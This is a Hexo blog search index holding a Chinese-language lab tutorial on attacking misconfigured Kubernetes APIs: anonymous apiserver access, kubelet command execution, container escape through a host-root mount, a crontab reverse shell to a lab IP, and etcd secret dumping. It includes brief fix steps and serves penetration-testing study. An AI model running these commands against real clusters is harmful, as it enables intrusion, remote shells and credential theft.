<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>K8S渗透-API配置不当或未鉴权</title>
      <link href="/2022/08/11/k8s-shen-tou-api-pei-zhi-bu-dang-huo-wei-jian-quan/"/>
      <url>/2022/08/11/k8s-shen-tou-api-pei-zhi-bu-dang-huo-wei-jian-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="K8S渗透-API配置不当或未鉴权"><a href="#K8S渗透-API配置不当或未鉴权" class="headerlink" title="K8S渗透-API配置不当或未鉴权"></a>K8S渗透-API配置不当或未鉴权</h1><h2 id="0x01-背景知识"><a href="#0x01-背景知识" class="headerlink" title="0x01 背景知识"></a>0x01 背景知识</h2><p>容器、容器编排组件 API 配置不当或未鉴权</p><p>重点关注如下的服务和端口</p><pre class="line-numbers language-Plain"><code class="language-Plain">kube-apiserver: 6443, 8080kubectl proxy: 8001kubelet: 10250, 10255, 4149dashboard: 30000docker api: 2375etcd: 2379, 2380<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x02-kube-apiserver"><a href="#0x02-kube-apiserver" class="headerlink" title="0x02 kube-apiserver"></a>0x02 kube-apiserver</h2><h3 id="背景知识-8080和6443端口"><a href="#背景知识-8080和6443端口" class="headerlink" title="背景知识 - 8080和6443端口"></a>背景知识 - 8080和6443端口</h3><p>旧版本的k8s的API Server 默认会开启两个端口：8080 和 6443。6443是安全端口，安全端口使用TLS加密；但是8080 端口无需认证，仅用于测试。6443 端口需要认证，且有 TLS 保护。</p><p>新版本k8s默认已经不开启8080。需要更改相应的配置，修改<code>/etc/kubernetes/manifests/kube-apiserver.yaml</code>，添加</p><pre class="line-numbers language-Plain"><code class="language-Plain">–insecure-port=8080–insecure-bind-address=0.0.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>重启服务<code>systemctl restart kubelet</code></p><p>在实际环境中，因为8080端口相对比较常见，导致在内部排查常常忽略这个风险点。</p><h3 id="8080端口利用过程"><a href="#8080端口利用过程" class="headerlink" title="8080端口利用过程"></a>8080端口利用过程</h3><h4 id="高本版不开放8080端口"><a href="#高本版不开放8080端口" class="headerlink" title="高本版不开放8080端口"></a>高本版不开放8080端口</h4><p><img src="/img/k8sApi/3tMF3xFDoWqJ4BGcz3NfPfMAb7e1qAtdAo2F61kJu3M.png" alt="image"></p><h4 id="允许匿名"><a href="#允许匿名" class="headerlink" title="允许匿名"></a>允许匿名</h4><p><code>vi /etc/kubernetes/manifests/kube-apiserver.yaml</code></p><p>原先的配置如下</p><p><img src="/img/k8sApi/bDsnYTTW3Uy1Ko1_CfmEZlOoU7nzFt5N5uSPeM6rTN4.png" alt="image"></p><p>修改成如下</p><p><img src="/img/k8sApi/a3SW-xxCeNnGP8t4YukMquZRT62eTZU8-bBgjBev9nw.png" alt="image"></p><p>重启服务<code>systemctl restart kubelet</code> </p><h4 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h4><p>再访问8080端口，发现就能查看了。</p><p><img src="/img/k8sApi/6E2jdaYtlrcVNyO4VJO-YrWqbl-l-D2Q2c7kR13sxDc.png" alt="image"></p><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>通过kubectl获取权限</p><pre class="line-numbers language-python"><code class="language-python">kubectl <span class="token operator">-</span>s <span class="token string">"http://ip:8080"</span> get pods  进入容器执行命令kubectl <span class="token operator">-</span>s <span class="token string">"http://ip:8080"</span> <span class="token keyword">exec</span> pod名称 <span class="token operator">-</span>n 命名空间 <span class="token operator">-</span>it <span class="token operator">-</span>c 容器名称 <span class="token operator">/</span>bin<span class="token operator">/</span>sh <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/h9hV3GEXgRNgCh7wxp7amAeys7rWMn7nsP82XfryGrY.png" alt="image"></p><p>后续就可以通过逃逸宿主机获取权限</p><h3 id="6443端口利用过程"><a href="#6443端口利用过程" class="headerlink" title="6443端口利用过程"></a>6443端口利用过程</h3><h4 id="默认鉴权"><a href="#默认鉴权" class="headerlink" title="默认鉴权"></a>默认鉴权</h4><p>6443端口的利用要通过API Server的鉴权，直接访问会提示匿名用户鉴权失败</p><pre class="line-numbers language-python"><code class="language-python">curl https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">6443</span> <span class="token operator">-</span>k<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/k8sApi/TtrArZmX_zFEzYfDFhzGA9YqdFXEkJe-OD5ZhYkXrdc.png" alt="image"></p><h4 id="允许匿名-1"><a href="#允许匿名-1" class="headerlink" title="允许匿名"></a>允许匿名</h4><p>在master中运行下面命令，将<code>&quot;system:anonymous&quot;</code>用户绑定到<code>&quot;cluster-admin&quot;</code>用户组，从而使6443端口允许匿名用户以管理员权限向集群内部下发指令。</p><pre class="line-numbers language-python"><code class="language-python">kubectl create clusterrolebinding system<span class="token punctuation">:</span>anonymous   <span class="token operator">-</span><span class="token operator">-</span>clusterrole<span class="token operator">=</span>cluster<span class="token operator">-</span>admin   <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">=</span>system<span class="token punctuation">:</span>anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/k8sApi/wWLFDt0zV_yIKY2ReK4PopqxgpsgoirRmBc9lCEkjU8.png" alt="image"></p><h4 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h4><p>然后再访问6443接口，发现匿名用户也能够访问到各个接口。</p><p><img src="/img/k8sApi/lB5mcveDgyduP1leA6ug0O-p0OHmK56VED7Lh6QYL1I.png" alt="image"></p><p>利用cdk工具通过<code>&quot;system:anonymous&quot;</code>匿名账号尝试登录</p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>cdk_linux_amd64_upx kcurl anonymous get <span class="token string">"https://192.168.66.10:6443/api/v1/nodes"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/k8sApi/ESkK02EjOjDMd52yh-T52Zhk2M6qECHtTvoxAP5Uuks.png" alt="image"></p><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p>生成配置文件然后用kubectl 利用这个漏洞，因为这里是未授权，所以可以创建一个nobody用户，密码为空。</p><pre class="line-numbers language-python"><code class="language-python">kubectl <span class="token operator">-</span><span class="token operator">-</span>kubeconfig<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>test_config config set<span class="token operator">-</span>cluster hacked_cluster <span class="token operator">-</span><span class="token operator">-</span>server<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">6443</span><span class="token operator">/</span>  <span class="token operator">-</span><span class="token operator">-</span>insecure<span class="token operator">-</span>skip<span class="token operator">-</span>tls<span class="token operator">-</span>verifykubectl <span class="token operator">-</span><span class="token operator">-</span>kubeconfig<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>test_config config set<span class="token operator">-</span>credentials nobody <span class="token operator">-</span><span class="token operator">-</span>username<span class="token operator">=</span>nobody <span class="token operator">-</span><span class="token operator">-</span>password<span class="token operator">=</span><span class="token string">""</span>kubectl <span class="token operator">-</span><span class="token operator">-</span>kubeconfig<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>test_config config set<span class="token operator">-</span>context test_context <span class="token operator">-</span><span class="token operator">-</span>cluster<span class="token operator">=</span>hacked_cluster <span class="token operator">-</span><span class="token operator">-</span>user<span class="token operator">=</span>nobodykubectl <span class="token operator">-</span><span class="token operator">-</span>kubeconfig<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>test_config config use<span class="token operator">-</span>context test_context<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>使用上述配置文件，即可轻易地控制对应k8s集群，相当于在master上控制k8s集群</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#访问默认namespace下的pods</span>kubectl <span class="token operator">-</span><span class="token operator">-</span>kubeconfig<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>test_config  get pods<span class="token comment" spellcheck="true">#进入任意容器rce</span>kubectl <span class="token operator">-</span><span class="token operator">-</span>kubeconfig<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>test_config <span class="token keyword">exec</span> pod名称 <span class="token operator">-</span>n 命名空间 <span class="token operator">-</span>it <span class="token operator">-</span>c 容器名称 <span class="token operator">/</span>bin<span class="token operator">/</span>sh kubectl <span class="token operator">-</span><span class="token operator">-</span>kubeconfig<span class="token operator">=</span><span class="token punctuation">.</span><span class="token operator">/</span>test_config  <span class="token keyword">exec</span> <span class="token operator">-</span>it tomcat<span class="token operator">-</span>deployment<span class="token number">-6c8558fd7b</span><span class="token operator">-</span>j52qf <span class="token operator">/</span>bin<span class="token operator">/</span>bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/sJePXCNQwBckLFUvORvSrcxhJRfdRXmQFBmD8cX0Jrw.png" alt="image"></p><p>这个时候只是可以做api-server能做的任何事情，如果想再深入拿到宿主机的shell，就需要容器逃逸。</p><h4 id="逃逸获取宿主机权限"><a href="#逃逸获取宿主机权限" class="headerlink" title="逃逸获取宿主机权限"></a>逃逸获取宿主机权限</h4><p>接着在本机上新建个yaml文件用于创建容器，并将节点的<strong>根目录挂载到容器的 /mnt 目录</strong>，内容如下：</p><pre class="line-numbers language-python"><code class="language-python">apiVersion<span class="token punctuation">:</span> v1kind<span class="token punctuation">:</span> Podmetadata<span class="token punctuation">:</span>  name<span class="token punctuation">:</span> testspec<span class="token punctuation">:</span>  containers<span class="token punctuation">:</span>  <span class="token operator">-</span> image<span class="token punctuation">:</span> hub<span class="token punctuation">.</span>atguigu<span class="token punctuation">.</span>com<span class="token operator">/</span>library<span class="token operator">/</span>tomcat<span class="token punctuation">:</span>v1    name<span class="token punctuation">:</span> test<span class="token operator">-</span>container    volumeMounts<span class="token punctuation">:</span>    <span class="token operator">-</span> mountPath<span class="token punctuation">:</span> <span class="token operator">/</span>mnt      name<span class="token punctuation">:</span> test<span class="token operator">-</span>volume  volumes<span class="token punctuation">:</span>  <span class="token operator">-</span> name<span class="token punctuation">:</span> test<span class="token operator">-</span>volume    hostPath<span class="token punctuation">:</span>      path<span class="token punctuation">:</span> <span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使用 kubectl 创建容器,这个时候我们发现是无法指定在哪个节点上创建pod。</p><pre class="line-numbers language-Plain"><code class="language-Plain">kubectl --kubeconfig=./test_config create -f test.yamlkubectl --kubeconfig=./test_config --namespace=default exec -it test bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/JOjaW5Kd8D69YYj-975mN2wIil2yUqK3JyrXEmpJjQc.png" alt="image"></p><p>写入公钥免密登陆</p><p><img src="/img/k8sApi/acO3eOEj2KBDUuX_cJkG4BkIZeZHYVSkmIlH5HoE0FE.png" alt="image"></p><p>因为该pod是在node1下，所以通过私钥可以直接登录node1节点</p><p><img src="/img/k8sApi/nGrd9do-2d3NAvexYWB47bV5nvPHnOs9WsB_7rqhnlU.png" alt="image"></p><p>也写入反弹 shell 的定时任务</p><pre class="line-numbers language-Plain"><code class="language-Plain">echo -e "* * * * * root bash -i >& /dev/tcp/192.168.11.128/4444 0>&1\n" >> /mnt/etc/crontab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="0x03-Kublet-API未授权"><a href="#0x03-Kublet-API未授权" class="headerlink" title="0x03 Kublet API未授权"></a>0x03 Kublet API未授权</h2><h3 id="背景知识-10250-10255-4149端口"><a href="#背景知识-10250-10255-4149端口" class="headerlink" title="背景知识 - 10250, 10255, 4149端口"></a>背景知识 - 10250, 10255, 4149端口</h3><p>kubelet是与容器接口进行交互</p><p>10250（kubelet API）：kubelet server 与 apiserver 通信的端口，定期请求 apiserver 获取自己所应当处理的任务，通过该端口可以访问获取 node 资源以及状态。该端口在最新版Kubernetes是有鉴权的。</p><p>4194（cAdvisor 监听）：kublet 通过该端口可以获取到该节点的环境信息以及 node 上运行的容器状态等内容，访问 <a href="http://localhost:4194" target="_blank" rel="noopener">http://localhost:4194</a> 可以看到 cAdvisor 的管理界面,通过 kubelet 的启动参数 <code>--cadvisor-port</code> 可以指定启动的端口。</p><p>10255 （readonly API）：提供了 pod 和 node 的信息，接口以只读形式暴露出去，访问该端口不需要认证和鉴权。</p><p><img src="/img/k8sApi/-DxMg8nP9V-D0NQsaACBYs3vwMW50J1UyM-axBEYYi8.png" alt="image"></p><h3 id="修改配置，允许未授权"><a href="#修改配置，允许未授权" class="headerlink" title="修改配置，允许未授权"></a>修改配置，允许未授权</h3><p>在新版本Kubernetes中当使用以下配置打开匿名访问时便可能存在kubelet未授权访问漏洞：</p><p>编辑 <code>/var/lib/kubelet/config.yaml</code> 将 <code>anonymous enabled</code> 修改为<code>true</code>，将 <code>authorization mode</code> 修改为 <code>AlwaysAllow</code>，然后重启服务<code>systemctl restart kubelet</code>。</p><p><img src="/img/k8sApi/4LzvKzwbRpsX9hgC9U7UJaPb7Fo1X5wj3wd3ve3OQb8.png" alt="image"></p><p><img src="/img/k8sApi/4L3fmj15_eyFEjZTK6jbVOmE0lsmlKLT1GS-xLR1QN4.png" alt="image"></p><p>重启服务<code>systemctl restart kubelet</code></p><h3 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h3><p>访问<code>https://IP:10250/pods</code> ，这个pods 接口泄露了<code>kube-system</code> namespace下的所有pods详细信息。</p><p><img src="/img/k8sApi/r6e0UCYowLzCumQPw38Ir2xgwVogv8a7yXlmS5edYCY.png" alt="image"></p><p><img src="/img/k8sApi/auHHwW6okg4EBV4f7BR9913v_C2ishITQvZJm2ruhYQ.png" alt="image"></p><h3 id="手工利用"><a href="#手工利用" class="headerlink" title="手工利用"></a>手工利用</h3><table><thead><tr><th>Kubelet API</th><th>HTTP request</th><th>Description</th></tr></thead><tbody><tr><td>/stats</td><td>GET /stats<br><br>GET /stats/summary <br><br>GET /stats/summary?only_cpu_and_memory=true<br><br>GET /stats/container <br><br>GET /stats/{namespace}/{podName}/{uid}/{containerName} <br><br>GET /stats/{podName}/{containerName} <br></td><td>Return the performance stats of node, pods and containers</td></tr><tr><td>/metrics</td><td>GET /metrics<br><br>GET /metrics/cadvisor<br><br>GET /metrics/probes<br><br>GET /metrics/resource/v1alpha1</td><td>Return information about node CPU and memory usage</td></tr><tr><td>/logs</td><td>GET /logs<br><br>GET /logs/{subpath}</td><td>Logs from the node</td></tr><tr><td>/spec</td><td>GET /spec</td><td>Cached MachineInfo returned by cadvisor</td></tr><tr><td>/pods</td><td>GET /pods</td><td>List of pods</td></tr><tr><td>/healthz</td><td>GET /healthz<br><br>GET /healthz/log <br><br>GET /healthz/ping<br><br>GET /healthz/syncloop</td><td>Check the state of the node</td></tr><tr><td>/configz</td><td>GET /configz</td><td>Kubelet’s configurations</td></tr><tr><td>/containerLogs</td><td>GET /containerLogs/{podNamespace}/{podID}/{containerName}</td><td>Container’s logs</td></tr><tr><td>/run</td><td>POST /run/{podNamespace}/{podID}/{containerName}<br>POST /run/{podNamespace}/{podID}/{uid}/{containerName}<br>* The body of the request: <br>“cmd={command}”<br>Example: <br>“cmd=ls /“</td><td>Run command inside a container</td></tr><tr><td>/exec</td><td>GET  /exec/{podNamespace}/{podID}/{containerName}?command={command}/&amp;input=1&amp;output=1&amp;tty=1<br><br>POST /exec/{podNamespace}//{containerName}?command={command}/&amp;input=1&amp;output=1&amp;tty=1<br><br>GET  /exec/{podNamespace}/{podID}/{uid}/{containerName}?command={command}/&amp;input=1&amp;output=1&amp;tty=1<br><br>POST /exec/{podNamespace}/{podID}/{uid}/{containerName}?command={command}/&amp;input=1&amp;output=1&amp;tty=1</td><td>Run command inside a container with option for stream (interactive)</td></tr><tr><td>/cri</td><td>GET /cri/exec/{valueFrom302}?cmd={command}</td><td>Run commands inside a container through the Container Runtime Interface (CRI)</td></tr><tr><td>/attach</td><td>GET  /attach/{podNamespace}/{podID}/{containerName}<br><br>POST /attach/{podNamespace}//{containerName}<br><br>GET  /attach/{podNamespace}/{podID}/{uid}/{containerName}<br><br>POST /attach/{podNamespace}/{podID}/{uid}/{containerName}</td><td>Attach to a container</td></tr><tr><td>/portForward</td><td>GET  /portForward/{podNamespace}/{podID}/{containerName}<br><br>POST /portForward/{podNamespace}//{containerName}<br><br>GET  /portForward/{podNamespace}/{podID}/{uid}/{containerName}<br><br>POST /portForward/{podNamespace}/{podID}/{uid}/{containerName}</td><td>Port forwarding inside the contianer</td></tr><tr><td>/runningpods</td><td>GET  /runningpods</td><td>List all the running pods</td></tr><tr><td>/debug</td><td>GET  /debug/pprof/{profile}<br><br>GET /debug/flags/v<br><br>PUT /debug/flags/v (body: {integer})</td><td></td></tr></tbody></table><p>使用curl执行命令</p><pre class="line-numbers language-python"><code class="language-python">curl <span class="token operator">-</span>X POST https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">10250</span><span class="token operator">/</span>run<span class="token operator">/</span>kube<span class="token operator">-</span>system<span class="token operator">/</span>kube<span class="token operator">-</span>proxy<span class="token operator">-</span>2k6fd<span class="token operator">/</span>kube<span class="token operator">-</span>proxy <span class="token operator">-</span>d <span class="token string">"cmd=id"</span> <span class="token operator">-</span>kcurl <span class="token operator">-</span>X POST https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">10250</span><span class="token operator">/</span>run<span class="token operator">/</span>kube<span class="token operator">-</span>system<span class="token operator">/</span>kube<span class="token operator">-</span>proxy<span class="token operator">-</span>2k6fd<span class="token operator">/</span>kube<span class="token operator">-</span>proxy <span class="token operator">-</span>d <span class="token string">"cmd=ip a"</span> <span class="token operator">-</span>k<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/J9Tlzwgz5z5ZKdTJ9MmuaSDrwit0E9Pvhn6rc9K7WUo.png" alt="image"></p><h3 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h3><h4 id="检测RCE漏洞"><a href="#检测RCE漏洞" class="headerlink" title="检测RCE漏洞"></a>检测RCE漏洞</h4><p><a href="https://github.com/cyberark/kubeletctl/releases" target="_blank" rel="noopener">https://github.com/cyberark/kubeletctl/releases</a></p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>kubeletctl_linux_amd64 <span class="token operator">-</span><span class="token operator">-</span>server <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span> scan rce<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>+的都是可以执行命令</p><p><img src="/img/k8sApi/hl2V2dLUbGncF5flkoGl-oh0P0PC8TGXbIc-paIPLa8.png" alt="image"></p><h4 id="获取交互式命令"><a href="#获取交互式命令" class="headerlink" title="获取交互式命令"></a>获取交互式命令</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>kubeletctl_linux_amd64 <span class="token operator">-</span><span class="token operator">-</span>server <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span> <span class="token operator">-</span>p kube<span class="token operator">-</span>proxy<span class="token operator">-</span>2k6fd <span class="token operator">-</span>n kube<span class="token operator">-</span>system <span class="token operator">-</span>c kube<span class="token operator">-</span>proxy <span class="token keyword">exec</span> <span class="token string">"/bin/sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/k8sApi/e1mPmfeLWgGof3CgoRymll7cjFuwKi6Ri1Obdg-AsmM.png" alt="image"></p><h4 id="批量执行命令"><a href="#批量执行命令" class="headerlink" title="批量执行命令"></a>批量执行命令</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>kubeletctl_linux_amd64 <span class="token operator">-</span><span class="token operator">-</span>server <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span> run <span class="token string">"uname -a"</span> <span class="token operator">-</span><span class="token operator">-</span>all<span class="token operator">-</span>pods<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/k8sApi/bOddxGBM84EpAso7by8gHIGy-CHDjFSuk2Z06LSkcxE.png" alt="image"></p><h4 id="检测Token"><a href="#检测Token" class="headerlink" title="检测Token"></a>检测Token</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>kubeletctl_linux_amd64 <span class="token operator">-</span><span class="token operator">-</span>server <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span> scan token<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/k8sApi/MGUVewNx5yAc7P51UKFl_nyECRq9f351K4e7irXlj3A.png" alt="image"></p><h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><p>在<code>https://192.168.66.10:10250/pods</code> 查看所有pod时，看哪个pod是在特权模式下启动的，然后后续就对该pod进行逃逸获取宿主机权限。</p><p><img src="/img/k8sApi/jwRiOCNrXl0uUpIAcnRDTMKT2e2vXcc3FkxhSxsH-oA.png" alt="image"></p><p>如下所示</p><p><img src="/img/k8sApi/rdPwmJ4TaVA2AKJoFv-TxrT40tv6MWwbAPnvXDy6Vnw.png" alt="image"></p><h3 id="10255端口"><a href="#10255端口" class="headerlink" title="10255端口"></a>10255端口</h3><p>kubelet默认会开放10255只读端口，例如：ip:10255/pods，用于查询解点pods信息，但这些信息中会包含环境变量，健康探针，启动钩子等等，这些很多都是敏感信息（<strong>Mysql、Redis等各种数据库的账号密码</strong>），所以不能对外暴露该只读接口。</p><h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><p>搜索关键词”redis，mysql，password”等，如果有redis的密码，则通过主从复制、计划任务、公私钥等方式获取redis服务器的权限</p><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><p>参考官网</p><p><img src="/img/k8sApi/jv1fh_DQ7qRTBnw4ahXqzNMwGdKPi-jiynHOf8avGLM.png" alt="image"></p><p>1 kubelet增加启动参数：–read-only-port=0</p><p>2 每台节点安全组绕过10255端口</p><p>3 对于每台节点设置iptables拒绝10255进来的流量</p><h2 id="0x04-ETCD"><a href="#0x04-ETCD" class="headerlink" title="0x04 ETCD"></a>0x04 ETCD</h2><h3 id="背景介绍-2379端口"><a href="#背景介绍-2379端口" class="headerlink" title="背景介绍 - 2379端口"></a>背景介绍 - 2379端口</h3><p>是构建一个高可用的分布式键值(key-value)数据库, 用于服务发现、共享配置以及一致性保障等。目前已广泛应用在kubernetes、ROOK、CoreDNS、M3以及openstack等领域。</p><p>Etcd比较常见的版本有v2版本和v3版本，v2、v3版本的共同点是共享同一套raft协议代码，不同点是二者为两个独立的应用，互不兼容，其接口、存储都是不相同的。</p><p>值得注意的是，Kubernetes集群已经在Kubernetes v1.11中弃用Etcdv2 版本，在新版本的Kubernetes中，Kubernetes采用 Etcd v3存储数据。</p><ul><li>启动etcd时，未使用client-cert-auth参数打开证书校验；</li><li>Etcd 2379端口公网暴露；</li><li>由于SSRF漏洞导致Etcd 127.0.0.1:2379 可访问；</li><li>Etcd cert泄露。</li></ul><h3 id="修改配置，允许未授权-1"><a href="#修改配置，允许未授权-1" class="headerlink" title="修改配置，允许未授权"></a>修改配置，允许未授权</h3><p><strong>默认的配置文件</strong></p><p><code>cat /etc/kubernetes/manifests/etcd.yaml</code> ，此时是开启了证书认证</p><p><img src="/img/k8sApi/P24hUdUj288ZvxakvqGeks4Rr_iXff8SgO1_7oHPrfA.png" alt="image"></p><p>访问时发现需要认证证书</p><p><img src="/img/k8sApi/1va082R35aY8Xz0ebYRyH8SWtFIGAkcwDS_9WOltepI.png" alt="image"></p><p>修改配置文件，允许未授权</p><pre class="line-numbers language-Plain"><code class="language-Plain">vi /etc/kubernetes/manifests/etcd.yaml- --listen-client-urls=http://0.0.0.0:2379- --advertise-client-urls=https://0.0.0.0:2379- --client-cert-auth=false<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/TJaTETjdAUr-RTkVkXTcft9gM2KyFmHF1TXNu2nOhrY.png" alt="image"></p><p>重启服务<code>systemctl restart kubelet</code></p><p>此时重新访问，发现可以未授权访问了</p><p><code>curl https://192.168.66.10:2379/version -k</code></p><p><img src="/img/k8sApi/DL7NaQt68TplJwzajZdSU1FniWHVicyaj-5Lk51Vjng.png" alt="image"></p><p><img src="/img/k8sApi/rjeteEJetTSUUnlvF7wGzRZ4MXSEPWo057bUWLqSS4Q.png" alt="image"></p><h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><p>下载工具etcdctl：<a href="https://github.com/etcd-io/etcd/releases/" target="_blank" rel="noopener">https://github.com/etcd-io/etcd/releases/</a></p><pre class="line-numbers language-Plain"><code class="language-Plain">etcd Client API  有v2和v3两个版本，服务器也可能同时支持v2 v3，一般k8s使用v3。1. 设置全局变量来限定etcd client客户端的版本Linux: export ETCDCTL_API=3windows: set ETCDCTL_API=32. 可以遍历所有key./etcdctl --endpoints=http://IP:2379/get/ --prefix --keys-only如果服务器启用了https，需要加上两个参数忽略证书校验 --insecure-transport    --insecure-skip-tls-verify./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379/get/ --prefix --keys-only3. 获取集群中保存的云产品AK./etcdctl --endpoints=https://IP:2379/ get /registry/secrets/default/acr-credential-518dfd1883737c2a6bde99ed6fee583c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h4><pre class="line-numbers language-python"><code class="language-python">export ETCDCTL_API<span class="token operator">=</span><span class="token number">3</span>set ETCDCTL_API<span class="token operator">=</span><span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/E4bn6OQquHmPRhwDnV3LpjggDesP8kx4dsLmTLzysYs.png" alt="image"></p><h4 id="获取所有的key"><a href="#获取所有的key" class="headerlink" title="获取所有的key"></a>获取所有的key</h4><p>如果是http则</p><p><code>./etcdctl --endpoints=http://192.168.66.10:2379/ get / --prefix --keys-only</code></p><p>如果是https则</p><p><code>./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://192.168.66.10:2379/ get / --prefix --keys-only</code></p><p><img src="/img/k8sApi/QF-1G0Zdsw8Mvhn3DsLFnvMBK5oNvAbDSMrS1cOUHMI.png" alt="image"></p><h4 id="读取clusterrole获取Kube-Apiserver的访问token"><a href="#读取clusterrole获取Kube-Apiserver的访问token" class="headerlink" title="读取clusterrole获取Kube Apiserver的访问token"></a>读取clusterrole获取Kube Apiserver的访问token</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>etcdctl <span class="token operator">-</span><span class="token operator">-</span>insecure<span class="token operator">-</span>transport<span class="token operator">=</span>false <span class="token operator">-</span><span class="token operator">-</span>insecure<span class="token operator">-</span>skip<span class="token operator">-</span>tls<span class="token operator">-</span>verify <span class="token operator">-</span><span class="token operator">-</span>endpoints<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">2379</span><span class="token operator">/</span> get <span class="token operator">/</span> <span class="token operator">-</span><span class="token operator">-</span>prefix <span class="token operator">-</span><span class="token operator">-</span>keys<span class="token operator">-</span>only  <span class="token operator">|</span> grep <span class="token operator">/</span>secrets<span class="token operator">/</span>kube<span class="token operator">-</span>system<span class="token operator">/</span>clusterrole<span class="token punctuation">.</span><span class="token operator">/</span>etcdctl <span class="token operator">-</span><span class="token operator">-</span>insecure<span class="token operator">-</span>transport<span class="token operator">=</span>false <span class="token operator">-</span><span class="token operator">-</span>insecure<span class="token operator">-</span>skip<span class="token operator">-</span>tls<span class="token operator">-</span>verify <span class="token operator">-</span><span class="token operator">-</span>endpoints<span class="token operator">=</span>https<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">66.10</span><span class="token punctuation">:</span><span class="token number">2379</span><span class="token operator">/</span> get <span class="token operator">/</span> <span class="token operator">-</span><span class="token operator">-</span>prefix <span class="token operator">-</span><span class="token operator">-</span>keys<span class="token operator">-</span>only  <span class="token operator">|</span> grep secrets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/img/k8sApi/1Tas5POX_o4YldO2D9CeGRlRWFPxsfTTAIswtYo7I4A.png" alt="image"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token punctuation">.</span><span class="token operator">/</span>etcdctl <span class="token operator">-</span><span class="token 